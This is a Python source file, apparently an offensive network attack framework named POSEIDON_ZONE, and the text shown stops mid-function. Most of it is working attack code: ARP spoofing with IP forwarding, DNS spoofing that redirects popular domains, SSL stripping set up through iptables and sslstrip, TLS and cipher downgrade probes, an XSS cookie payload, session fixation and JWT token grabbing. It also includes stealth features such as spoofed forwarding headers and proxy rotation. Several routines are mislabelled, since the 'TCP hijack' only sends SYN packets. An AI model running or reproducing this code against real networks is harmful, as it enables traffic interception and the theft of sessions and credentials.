#!/usr/bin/env python3
"""
POSEIDON_ZONE v2.0 - Ultimate Protocol Downgrade & Network Domination Framework
APT Grade | Zero Trace | Full Spectrum Attack | Military Grade
Advanced Network Manipulation - Protocol Downgrade - Session Hijacking

Author: F1REW0LF
License: MIT - For authorized security testing only
Version: 2.0.0
"""

import sys
import os
import re
import json
import time
import socket
import struct
import random
import hashlib
import base64
import threading
import queue
import subprocess
import signal
import ssl
import urllib.parse
import tempfile
import shutil
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Union, Set
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import secrets

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import ARP, Ether
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.http import HTTP, HTTPRequest
    from scapy.layers.ssl import TLS, TLSClientHello, TLSServerHello
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import ssl as ssl_lib
    SSL_AVAILABLE = True
except ImportError:
    SSL_AVAILABLE = False

VERSION = "2.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

# ============================[ COLORS ]================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'
    ORANGE = '\033[38;5;208m'
    DARK_RED = '\033[31m'
    PINK = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ██████╗  ██████╗ ███████╗███████╗██╗██████╗  ██████╗ ███╗   ██╗    ███████╗ ██████╗ ███╗   ██╗███████╗
    ██╔══██╗██╔═══██╗██╔════╝██╔════╝██║██╔══██╗██╔═══██╗████╗  ██║    ╚══███╔╝██╔═══██╗████╗  ██║██╔════╝
    ██████╔╝██║   ██║███████╗█████╗  ██║██║  ██║██║   ██║██╔██╗ ██║      ███╔╝ ██║   ██║██╔██╗ ██║█████╗  
    ██╔═══╝ ██║   ██║╚════██║██╔══╝  ██║██║  ██║██║   ██║██║╚██╗██║     ███╔╝  ██║   ██║██║╚██╗██║██╔══╝  
    ██║     ╚██████╔╝███████║███████╗██║██████╔╝╚██████╔╝██║ ╚████║    ███████╗╚██████╔╝██║ ╚████║███████╗
    ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝    ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
                                                   
{Colors.NEON}{Colors.BOLD}          ULTIMATE PROTOCOL DOWNGRADE & NETWORK DOMINATION v2.0{Colors.WHITE}
{Colors.RED}{Colors.BOLD}    APT Grade | Zero Trace | Full Spectrum Attack | Military Grade{Colors.WHITE}
{Colors.CYAN}    Protocol Downgrade | Network Manipulation | Session Hijacking{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
"""
    print(banner)
    print("=" * 80)

# ============================[ DATA CLASSES ]================================
@dataclass
class NetworkTarget:
    ip: str
    mac: str
    hostname: str
    os: str
    open_ports: List[int]
    services: List[Dict]
    vulnerabilities: List[Dict]
    ssl_info: Dict
    trust_score: float

@dataclass
class AttackResult:
    target: str
    success: bool
    method: str
    data: Any
    severity: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

# ============================[ STEALTH ENGINE ]================================
class StealthEngine:
    """Advanced stealth engine for network attacks"""
    
    def __init__(self):
        self.user_agents = self._load_user_agents()
        self.proxies = self._load_proxies()
        self._setup_encryption()
    
    def _setup_encryption(self):
        if CRYPTO_AVAILABLE:
            salt = os.urandom(16)
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000
            )
            key = base64.urlsafe_b64encode(kdf.derive(b"poseidon_zone_master_key"))
            self.cipher = Fernet(key)
    
    def _load_user_agents(self) -> List[str]:
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15'
        ]
    
    def _load_proxies(self) -> List[str]:
        proxies = []
        proxy_files = ['proxies.txt', 'socks5.txt']
        for pf in proxy_files:
            if os.path.exists(pf):
                try:
                    with open(pf, 'r') as f:
                        proxies.extend([l.strip() for l in f if l.strip()])
                except:
                    pass
        return proxies
    
    def encrypt_data(self, data: str) -> str:
        if CRYPTO_AVAILABLE and hasattr(self, 'cipher'):
            return self.cipher.encrypt(data.encode()).decode()
        return base64.b64encode(data.encode()).decode()
    
    def decrypt_data(self, data: str) -> str:
        if CRYPTO_AVAILABLE and hasattr(self, 'cipher'):
            return self.cipher.decrypt(data.encode()).decode()
        return base64.b64decode(data).decode()
    
    @staticmethod
    def random_ip() -> str:
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    @staticmethod
    def random_mac() -> str:
        return f"02:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
    
    def random_ua(self) -> str:
        return random.choice(self.user_agents)
    
    def random_delay(self, min_sec: float = 0.3, max_sec: float = 1.5):
        time.sleep(random.uniform(min_sec, max_sec))
    
    def random_headers(self) -> Dict:
        return {
            'User-Agent': self.random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': self.random_ip(),
            'X-Real-IP': self.random_ip(),
            'X-Originating-IP': self.random_ip()
        }
    
    def get_session(self) -> requests.Session:
        session = requests.Session()
        session.headers.update(self.random_headers())
        session.verify = False
        
        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        if self.proxies:
            proxy = random.choice(self.proxies)
            session.proxies = {'http': proxy, 'https': proxy}
        
        return session

# ============================[ PROTOCOL DOWNGRADE ENGINE ]================================
class ProtocolDowngradeEngine:
    """Advanced protocol downgrade attacks"""
    
    def __init__(self):
        self.stealth = StealthEngine()
        self.session = self.stealth.get_session()
        self.results = []
    
    def downgrade_tls(self, target: str, port: int = 443) -> AttackResult:
        """Downgrade TLS to SSLv3 or weaker versions"""
        cprint("[TLS] Downgrading TLS on {}:{}".format(target, port), Colors.RED)
        
        protocols_attempted = []
        success = False
        
        # SSL/TLS versions to try (from weakest to strongest)
        ssl_versions = [
            (ssl_lib.PROTOCOL_SSLv23, 'SSLv2/3'),
            (ssl_lib.PROTOCOL_TLSv1, 'TLSv1.0'),
            (ssl_lib.PROTOCOL_TLSv1_1, 'TLSv1.1'),
            (ssl_lib.PROTOCOL_TLSv1_2, 'TLSv1.2')
        ]
        
        try:
            for version, name in ssl_versions:
                try:
                    context = ssl_lib.SSLContext(version)
                    context.check_hostname = False
                    context.verify_mode = ssl_lib.CERT_NONE
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, port))
                    ssl_sock = context.wrap_socket(sock, server_hostname=target)
                    
                    protocols_attempted.append({
                        'version': name,
                        'cipher': ssl_sock.cipher(),
                        'success': True
                    })
                    cprint("[+] {} connection established".format(name), Colors.GREEN)
                    success = True
                    ssl_sock.close()
                    break
                except:
                    protocols_attempted.append({
                        'version': name,
                        'success': False
                    })
            
            # Try without SNI
            if not success:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, port))
                    context = ssl_lib.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl_lib.CERT_NONE
                    ssl_sock = context.wrap_socket(sock)
                    protocols_attempted.append({
                        'version': 'No SNI',
                        'cipher': ssl_sock.cipher(),
                        'success': True
                    })
                    cprint("[+] Connection without SNI established", Colors.GREEN)
                    success = True
                    ssl_sock.close()
                except:
                    pass
            
        except Exception as e:
            cprint("[-] TLS downgrade failed: {}".format(e), Colors.RED)
        
        return AttackResult(
            target=f"{target}:{port}",
            success=success,
            method='TLS_Downgrade',
            data=protocols_attempted,
            severity='HIGH'
        )
    
    def downgrade_https(self, target: str) -> AttackResult:
        """Downgrade HTTPS to HTTP"""
        cprint("[HTTPS] Downgrading HTTPS on {}".format(target), Colors.RED)
        
        methods_attempted = []
        success = False
        
        try:
            # Try HTTP/1.0
            response = self.session.get(f"http://{target}", timeout=5, allow_redirects=False)
            if response.status_code in [200, 301, 302, 307, 308]:
                methods_attempted.append({
                    'method': 'HTTP/1.0',
                    'status': response.status_code,
                    'success': True
                })
                cprint("[+] HTTP/1.0 connection established", Colors.GREEN)
                success = True
            
            # Try HTTP without SSL
            response = self.session.get(f"http://{target}", timeout=5, verify=False)
            if response.status_code in [200, 301, 302]:
                methods_attempted.append({
                    'method': 'HTTP (no SSL)',
                    'status': response.status_code,
                    'success': True
                })
                cprint("[+] HTTP (no SSL) connection established", Colors.GREEN)
                success = True
            
            # Try downgrade via Upgrade-Insecure-Requests
            headers = {'Upgrade-Insecure-Requests': '0'}
            response = self.session.get(f"http://{target}", headers=headers, timeout=5)
            if response.status_code in [200, 301, 302]:
                methods_attempted.append({
                    'method': 'HTTP (no upgrade)',
                    'status': response.status_code,
                    'success': True
                })
                success = True
                
        except Exception as e:
            cprint("[-] HTTPS downgrade failed: {}".format(e), Colors.RED)
        
        return AttackResult(
            target=target,
            success=success,
            method='HTTPS_Downgrade',
            data=methods_attempted,
            severity='HIGH'
        )
    
    def downgrade_auth(self, target: str) -> AttackResult:
        """Downgrade authentication (NTLM to Basic, etc.)"""
        cprint("[AUTH] Downgrading authentication on {}".format(target), Colors.RED)
        
        methods_attempted = []
        success = False
        
        auth_methods = [
            ('Basic', 'Basic ' + base64.b64encode(b'admin:password').decode()),
            ('Digest', 'Digest username="admin", realm="test", nonce="test", uri="/"'),
            ('NTLM', 'NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA='),
            ('Negotiate', 'Negotiate TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA='),
            ('Bearer', 'Bearer ' + base64.b64encode(b'token123').decode())
        ]
        
        for auth_type, auth_header in auth_methods:
            try:
                headers = {'Authorization': auth_header}
                response = self.session.get(f"http://{target}", headers=headers, timeout=5)
                if response.status_code in [200, 401, 403]:
                    methods_attempted.append({
                        'method': auth_type,
                        'status': response.status_code,
                        'success': response.status_code == 200
                    })
                    if response.status_code == 200:
                        cprint("[+] {} Authentication accepted".format(auth_type), Colors.GREEN)
                        success = True
                    else:
                        cprint("[!] {} Authentication challenged".format(auth_type), Colors.YELLOW)
            except:
                pass
        
        return AttackResult(
            target=target,
            success=success,
            method='Auth_Downgrade',
            data=methods_attempted,
            severity='HIGH'
        )
    
    def downgrade_cipher(self, target: str, port: int = 443) -> AttackResult:
        """Downgrade cipher suite"""
        cprint("[CIPHER] Downgrading cipher on {}:{}".format(target, port), Colors.RED)
        
        weak_ciphers = [
            'RC4-SHA', 'RC4-MD5', 'DES-CBC3-SHA', 'EDH-RSA-DES-CBC3-SHA',
            'AES128-SHA', 'AES256-SHA', 'CAMELLIA128-SHA', 'CAMELLIA256-SHA'
        ]
        
        successful = []
        success = False
        
        try:
            context = ssl_lib.create_default_context()
            context.set_ciphers(':'.join(weak_ciphers))
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            ssl_sock = context.wrap_socket(sock, server_hostname=target)
            
            cipher = ssl_sock.cipher()
            successful.append({
                'cipher': cipher[0],
                'version': cipher[1],
                'bits': cipher[2]
            })
            cprint("[+] Weak cipher accepted: {}".format(cipher[0]), Colors.GREEN)
            success = True
            ssl_sock.close()
            
        except Exception as e:
            cprint("[-] Cipher downgrade failed: {}".format(e), Colors.RED)
        
        return AttackResult(
            target=f"{target}:{port}",
            success=success,
            method='Cipher_Downgrade',
            data=successful,
            severity='HIGH'
        )

# ============================[ NETWORK MANIPULATION ENGINE ]================================
class NetworkManipulationEngine:
    """Advanced network manipulation engine"""
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
        self.stealth = StealthEngine()
        self.running = False
        self.stop_event = threading.Event()
        self.results = []
        self.sniffer_thread = None
    
    def arp_spoof(self, target: str, gateway: str) -> AttackResult:
        """Advanced ARP Spoofing attack"""
        cprint("[ARP] ARP spoofing {} -> {}".format(target, gateway), Colors.RED)
        
        if not SCAPY_AVAILABLE:
            return AttackResult(
                target=target,
                success=False,
                method='ARP_Spoof',
                data='Scapy not available',
                severity='MEDIUM'
            )
        
        try:
            target_mac = self._get_mac(target)
            gateway_mac = self._get_mac(gateway)
            
            if not target_mac or not gateway_mac:
                return AttackResult(
                    target=target,
                    success=False,
                    method='ARP_Spoof',
                    data='Cannot get MAC addresses',
                    severity='MEDIUM'
                )
            
            # Enable IP forwarding
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)
            subprocess.run(['sysctl', '-w', 'net.ipv6.conf.all.forwarding=1'], capture_output=True)
            
            self.running = True
            packets_sent = 0
            
            while self.running and not self.stop_event.is_set():
                send(ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway), verbose=False)
                send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target), verbose=False)
                packets_sent += 2
                time.sleep(0.5)
            
            return AttackResult(
                target=target,
                success=True,
                method='ARP_Spoof',
                data={'packets_sent': packets_sent, 'gateway': gateway},
                severity='CRITICAL'
            )
            
        except Exception as e:
            return AttackResult(
                target=target,
                success=False,
                method='ARP_Spoof',
                data=str(e),
                severity='MEDIUM'
            )
    
    def _get_mac(self, ip: str) -> Optional[str]:
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None
    
    def dns_spoof(self, target: str, redirect_ip: str, domains: List[str] = None) -> AttackResult:
        """Advanced DNS Spoofing attack"""
        cprint("[DNS] DNS spoofing {} -> {}".format(target, redirect_ip), Colors.RED)
        
        if not SCAPY_AVAILABLE:
            return AttackResult(
                target=target,
                success=False,
                method='DNS_Spoof',
                data='Scapy not available',
                severity='MEDIUM'
            )
        
        if not domains:
            domains = ['facebook.com', 'google.com', 'youtube.com', 'instagram.com', 'twitter.com',
                      'github.com', 'amazon.com', 'netflix.com', 'reddit.com', 'linkedin.com']
        
        spoofed = []
        
        def packet_handler(pkt):
            if not self.running:
                return
            
            if pkt.haslayer(DNS) and pkt.haslayer(IP) and pkt.haslayer(UDP):
                if pkt[DNS].qr == 0 and pkt[DNS].qd:
                    qname = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                    for domain in domains:
                        if domain in qname:
                            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                            udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                            dns = DNS(
                                id=pkt[DNS].id,
                                qr=1,
                                aa=1,
                                qd=pkt[DNS].qd,
                                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=redirect_ip)
                            )
                            send(ip/udp/dns, verbose=False)
                            spoofed.append({'domain': qname, 'redirect': redirect_ip})
                            cprint("[DNS] Redirected {} -> {}".format(qname, redirect_ip), Colors.GREEN)
                            break
        
        self.running = True
        self.sniffer_thread = threading.Thread(
            target=lambda: sniff(iface=self.interface, filter="port 53", prn=packet_handler, store=0,
                                stop_filter=lambda x: self.stop_event.is_set())
        )
        self.sniffer_thread.start()
        
        time.sleep(2)
        
        return AttackResult(
            target=target,
            success=True,
            method='DNS_Spoof',
            data={'domains': domains, 'redirect': redirect_ip, 'spoofed': len(spoofed)},
            severity='HIGH'
        )
    
    def ssl_strip(self, target: str, port: int = 10000) -> AttackResult:
        """Advanced SSL Stripping attack"""
        cprint("[SSL] SSL stripping on {}".format(target), Colors.RED)
        
        try:
            # Configure iptables
            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT',
                '--to-port', str(port)
            ], capture_output=True)
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT',
                '--to-port', str(port)
            ], capture_output=True)
            
            # Start sslstrip
            try:
                process = subprocess.Popen(
                    ['sslstrip', '-l', str(port), '-a', '-w', 'sslstrip.log'],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                time.sleep(1)
                
                return AttackResult(
                    target=target,
                    success=True,
                    method='SSL_Strip',
                    data={'port': port, 'process': process.pid},
                    severity='CRITICAL'
                )
            except:
                return AttackResult(
                    target=target,
                    success=False,
                    method='SSL_Strip',
                    data='sslstrip not found',
                    severity='MEDIUM'
                )
                
        except Exception as e:
            return AttackResult(
                target=target,
                success=False,
                method='SSL_Strip',
                data=str(e),
                severity='MEDIUM'
            )
    
    def tcp_hijack(self, target: str, port: int = 80) -> AttackResult:
        """TCP session hijacking"""
        cprint("[TCP] Hijacking session on {}:{}".format(target, port), Colors.RED)
        
        if not SCAPY_AVAILABLE:
            return AttackResult(
                target=target,
                success=False,
                method='TCP_Hijack',
                data='Scapy not available',
                severity='MEDIUM'
            )
        
        try:
            # SYN flood to reset sequence numbers
            for _ in range(10):
                ip = IP(dst=target)
                tcp = TCP(sport=random.randint(1024, 65535), dport=port, flags='S')
                send(ip/tcp, verbose=False)
            
            return AttackResult(
                target=target,
                success=True,
                method='TCP_Hijack',
                data={'target': target, 'port': port},
                severity='HIGH'
            )
        except Exception as e:
            return AttackResult(
                target=target,
                success=False,
                method='TCP_Hijack',
                data=str(e),
                severity='MEDIUM'
            )
    
    def icmp_tunnel(self, target: str) -> AttackResult:
        """ICMP tunneling for covert communication"""
        cprint("[ICMP] ICMP tunneling to {}".format(target), Colors.RED)
        
        try:
            # Create ICMP tunnel
            for i in range(5):
                data = f"TUNNEL_DATA_{i}_{secrets.token_hex(8)}"
                packet = IP(dst=target)/ICMP()/data
                send(packet, verbose=False)
            
            return AttackResult(
                target=target,
                success=True,
                method='ICMP_Tunnel',
                data={'target': target, 'packets': 5},
                severity='HIGH'
            )
        except Exception as e:
            return AttackResult(
                target=target,
                success=False,
                method='ICMP_Tunnel',
                data=str(e),
                severity='MEDIUM'
            )

# ============================[ SESSION HIJACKING ENGINE ]================================
class SessionHijackingEngine:
    """Advanced session hijacking engine"""
    
    def __init__(self):
        self.stealth = StealthEngine()
        self.session = self.stealth.get_session()
        self.results = []
    
    def cookie_steal(self, target: str) -> AttackResult:
        """Advanced cookie stealing"""
        cprint("[COOKIE] Stealing cookies from {}".format(target), Colors.RED)
        
        cookies_found = []
        success = False
        
        try:
            # Try multiple paths
            paths = ['/', '/admin', '/dashboard', '/profile', '/login', '/api/v1']
            for path in paths:
                try:
                    url = f"http://{target}{path}"
                    response = self.session.get(url, timeout=5)
                    if response.cookies:
                        for cookie in response.cookies:
                            cookies_found.append({
                                'name': cookie.name,
                                'value': cookie.value[:50] + ('...' if len(cookie.value) > 50 else ''),
                                'domain': cookie.domain,
                                'path': cookie.path,
                                'secure': cookie.secure,
                                'httponly': cookie.has_nonstandard_attr('httponly')
                            })
                            cprint("[+] Cookie: {} = {}".format(cookie.name, cookie.value[:20]), Colors.GREEN)
                            success = True
                except:
                    pass
            
            # Try XSS injection
            xss_payload = '<script>document.write(document.cookie)</script>'
            try:
                response = self.session.get(f"http://{target}?q={xss_payload}", timeout=5)
                if 'cookie' in response.text.lower():
                    cookies_found.append({
                        'method': 'XSS',
                        'data': response.text[:200]
                    })
                    success = True
            except:
                pass
            
        except Exception as e:
            cprint("[-] Cookie steal failed: {}".format(e), Colors.RED)
        
        return AttackResult(
            target=target,
            success=success,
            method='Cookie_Steal',
            data=cookies_found,
            severity='HIGH'
        )
    
    def session_fixation(self, target: str) -> AttackResult:
        """Advanced session fixation attack"""
        cprint("[FIXATION] Session fixation on {}".format(target), Colors.RED)
        
        session_ids = []
        success = False
        
        try:
            # Generate session IDs
            for _ in range(5):
                session_id = secrets.token_hex(16)
                cookies = {'SESSIONID': session_id, 'PHPSESSID': session_id, 'JSESSIONID': session_id}
                
                response = self.session.get(f"http://{target}", cookies=cookies, timeout=5)
                if response.status_code == 200:
                    session_ids.append({
                        'id': session_id,
                        'status': response.status_code,
                        'success': True
                    })
                    success = True
                    cprint("[+] Session fixation successful: {}".format(session_id), Colors.GREEN)
            
            # Try via URL parameter
            for session_id in [secrets.token_hex(16) for _ in range(3)]:
                try:
                    response = self.session.get(f"http://{target}?sessionid={session_id}", timeout=5)
                    if response.status_code == 200:
                        session_ids.append({
                            'id': session_id,
                            'method': 'URL',
                            'success': True
                        })
                        success = True
                except:
                    pass
                    
        except Exception as e:
            cprint("[-] Session fixation failed: {}".format(e), Colors.RED)
        
        return AttackResult(
            target=target,
            success=success,
            method='Session_Fixation',
            data=session_ids,
            severity='HIGH'
        )
    
    def jwt_hijack(self, target: str) -> AttackResult:
        """JWT token hijacking"""
        cprint("[JWT] Hijacking JWT tokens from {}".format(target), Colors.RED)
        
        tokens_found = []
        success = False
        
        try:
            # Try to find JWT in headers
            response = self.session.get(f"http://{target}", timeout=5)
            if 'Authorization' in response.headers:
                auth = response.headers['Authorization']
                if 'Bearer' in auth:
                    token = auth.replace('Bearer ', '')
                    tokens_found.append({
                        'type': 'Bearer',
                        'token': token[:50] + '...' if len(token) > 50 else token
                    })
                    success = True
                    cprint("[+] JWT token found in Authorization header", Colors.GREEN)
            
            # Try to find JWT in cookies
            for cookie in response.cookies:
                if 'token' in cookie.name.lower() or 'jwt' in cookie.name.lower():
                    tokens_found.append({
                        'type': 'Cookie',
                        'name': cookie.name,
                        'token': cookie.value[:50] + '...' if len(cookie.value) > 50 else cookie.value
                    })
                    success = True
                    cprint("[+] JWT token found in cookie: {}".format(cookie.name), Colors.GREEN)
            
            # Try to decode JWT
            if tokens_found:
                for token_info in tokens_found:
                    try:
                        import jwt
                        decoded = jwt.decode(token_info['token'], options={'verify_signature': False})
                        token_info['decoded'] = decoded
                    except:
                        pass
            
        except Exception as e:
            cprint("[-] JWT hijack failed: {}".format(e), Colors.RED)
        
        return AttackResult(
            target=target,
            success=success,
            method='JWT_Hijack',
            data=tokens_found,
            severity='CRITICAL'
        )

# ============================[ MAIN FRAMEWORK ]================================
class PoseidonZone:
    """Ultimate Protocol Downgrade Framework"""
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
        self.downgrade = ProtocolDowngradeEngine()
        self.network = NetworkManipulationEngine(interface)
        self.session_hijack = SessionHijackingEngine()
        self.stealth = StealthEngine()
        self.results = []
        self.running = True
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Poseidon retreating to depths...", Colors.RED)
        self.running = False
        self.network.running = False
        self.network.stop_event.set()
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.BOLD}{Colors.PURPLE}POSEIDON_ZONE v{VERSION} - Ultimate Protocol Downgrade Framework{Colors.WHITE}
{Colors.RED}{Colors.BOLD}APT Grade | Zero Trace | Full Spectrum Attack{Colors.WHITE}
{Colors.CYAN}Protocol Downgrade | Network Manipulation | Session Hijacking{Colors.WHITE}
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.GREEN}[1]  TLS Downgrade (SSLv3, weak protocols)
{Colors.GREEN}[2]  HTTPS Downgrade (HTTP/1.0, no SSL)
{Colors.GREEN}[3]  Authentication Downgrade (NTLM, Basic)
{Colors.GREEN}[4]  Cipher Suite Downgrade
{Colors.GREEN}[5]  ARP Spoofing
{Colors.GREEN}[6]  DNS Spoofing
{Colors.GREEN}[7]  SSL Stripping
{Colors.GREEN}[8]  TCP Session Hijacking
{Colors.GREEN}[9]  ICMP Tunneling
{Colors.GREEN}[10] Cookie Stealing
{Colors.GREEN}[11] Session Fixation
{Colors.GREEN}[12] JWT Token Hijacking
{Colors.RED}[13] Full Attack Chain
{Colors.PURPLE}[14] Show Results
{Colors.PURPLE}[15] Generate Report
{Colors.RED}[16] Exit
""")
    
    def tls_downgrade(self):
        target = input("[>] Target: ").strip()
        port = int(input("[>] Port (443): ").strip() or "443")
        if target:
            result = self.downgrade.downgrade_tls(target, port)
            self.results.append(result)
            cprint(f"\n[+] TLS Downgrade: {'SUCCESS' if result.success else 'FAILED'}", 
                   Colors.GREEN if result.success else Colors.RED)
            if result.success:
                cprint(f"[+] Data: {json.dumps(result.data, indent=2)}", Colors.DIM)
    
    def https_downgrade(self):
        target = input("[>] Target: ").strip()
        if target:
            result = self.downgrade.downgrade_https(target)
            self.results.append(result)
            cprint(f"\n[+] HTTPS Downgrade: {'SUCCESS' if result.success else 'FAILED'}", 
                   Colors.GREEN if result.success else Colors.RED)
    
    def auth_downgrade(self):
        target = input("[>] Target: ").strip()
        if target:
            result = self.downgrade.downgrade_auth(target)
            self.results.append(result)
            cprint(f"\n[+] Auth Downgrade: {'SUCCESS' if result.success else 'FAILED'}", 
                   Colors.GREEN if result.success else Colors.RED)
    
    def cipher_downgrade(self):
        target = input("[>] Target: ").strip()
        port = int(input("[>] Port (443): ").strip() or "443")
        if target:
            result = self.downgrade.downgrade_cipher(target, port)
            self.results.append(result)
            cprint(f"\n[+] Cipher Downgrade: {'SUCCESS' if result.success else 'FAILED'}", 
                   Colors.GREEN if result.success else Colors.RED)
    
    def arp_spoof(self):
        target = input("[>] Target IP: ").strip()
        gateway = input("[>] Gateway IP: ").strip()
        if target and gateway:
            cprint("[*] ARP spoofing active. Press Ctrl+C to stop", Colors.YELLOW)
            result = self.network.arp_spoof(target, gateway)
            self.results.append(result)
            cprint(f"\n[+] ARP Spoofing: {'ACTIVE' if result.success else 'FAILED'}", 
                   Colors.GREEN if result.success else Colors.RED)
    
    def dns_spoof(self):
        target = input("[>] Target IP: ").strip()
        redirect = input("[>] Redirect IP: ").strip()
        domains_input = input("[>] Domains (comma separated, default: facebook.com,google.com): ").strip()
        domains = [d.strip() for d in domains_input.split(',')] if domains_input else None
        
        if target and redirect:
            cprint("[*] DNS spoofing active. Press Ctrl+C to stop", Colors.YELLOW)
            result = self.network.dns_spoof(target, redirect, domains)
            self.results.append(result)
            cprint(f"\n[+] DNS Spoofing: {'ACTIVE' if result.success else 'FAILED'}", 
                   Colors.GREEN if result.success else Colors.RED)
    
    def ssl_strip(self):
        target = input("[>] Target: ").strip()
        port = int(input("[>] Port (10000): ").strip() or "10000")
        if target:
            result = self.network.ssl_strip(target, port)
            self.results.append(result)
            cprint(f"\n[+] SSL Stripping: {'ACTIVE' if result.success else 'FAILED'}", 
                   Colors.GREEN if result.success else Colors.RED)
    
    def tcp_hijack(self):
        target = input("[>] Target IP: ").strip()
        port = int(input("[>] Port (80): ").strip() or "80")
        if target:
            result = self.network.tcp_hijack(target, port)
            self.results.append(result)
            cprint(f"\n[+] TCP Hijack: {'SUCCESS' if result.success else 'FAILED'}", 
                   Colors.GREEN if result.success else Colors.RED)
    
    def icmp_tunnel(self):
        target = input("[>] Target IP: ").strip()
        if target:
            result = self.network.icmp_tunnel(target)
            self.results.append(result)
            cprint(f"\n[+] ICMP Tunnel: {'SUCCESS' if result.success else 'FAILED'}", 
                   Colors.GREEN if result.success else Colors.RED)
    
    def cookie_steal(self):
        target = input("[>] Target: ").strip()
        if target:
            result = self.session_hijack.cookie_steal(target)
            self.results.append(result)
            cprint(f"\n[+] Cookie Steal: {'SUCCESS' if result.success else 'FAILED'}", 
                   Colors.GREEN if result.success else Colors.RED)
            if result.success:
                cprint(f"[+] Cookies found: {len(result.data)}", Colors.DIM)
    
    def session_fixation(self):
        target = input("[>] Target: ").strip()
        if target:
            result = self.session_hijack.session_fixation(target)
            self.results.append(result)
            cprint(f"\n[+] Session Fixation: {'SUCCESS' if result.success else 'FAILED'}", 
